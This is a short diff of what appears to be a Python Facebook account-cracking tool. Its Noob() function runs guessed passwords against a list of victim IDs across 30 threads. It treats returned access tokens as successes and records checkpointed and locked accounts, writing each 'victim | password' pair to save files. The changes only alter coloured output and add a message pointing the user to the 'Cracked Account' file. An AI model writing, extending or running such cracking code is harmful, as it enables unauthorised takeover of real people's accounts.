@@ -142,19 +142,19 @@ def Noob():
       q = json.load(data)
       #print(q)
       if 'access_token' in q:
-        motion (ccl+'[NOOB_OK] ' + victim + '  |  ' + line+"\n")
+        motion (gcl+'\n[NOOB_OK] ' + victim + '  |  ' + line+"\n")
         okb = open('save/Noob_Successful.txt', 'a')
         okb.write(victim +" [ NOOB ] "+ line + '\n')
         okb.close()
         exit()        
       elif 'www.facebook.com' in q['error_msg']:
-        motion( ycl+'[NOOB_CP] ' +victim+'  |  '+ycl + line+"\n")
+        motion( ycl+'\n[NOOB_CP] ' +victim+'  |  '+ycl + line+"\n")
         cps = open('save/Noob_CheckPoint.txt', 'a')
         cps.write(victim +" [ NOOB ] "+ line + '\n')
         cps.close()
         exit()
       elif q['error_code']  == "368" or q['error_code']  == 368:
-        motion('\n[ LOCKED ] ' +victim+'  |  ' + line+"\n")
+        motion(rcl+'\n[ LOCKED ] ' +victim+'  |  ' + line+"\n")
         okb = open('save/Noob_Successful.txt', 'a')
         okb.write(victim +" [ NOOB ] "+ line + '\n')
         okb.close()
@@ -167,5 +167,5 @@ def Noob():
   p = ThreadPool(30)
   p.map(main,id)
  
-
+motion(ccl+"\nOpen 'save' file You will find Cracked Account in a .txt File ")
 Noob()
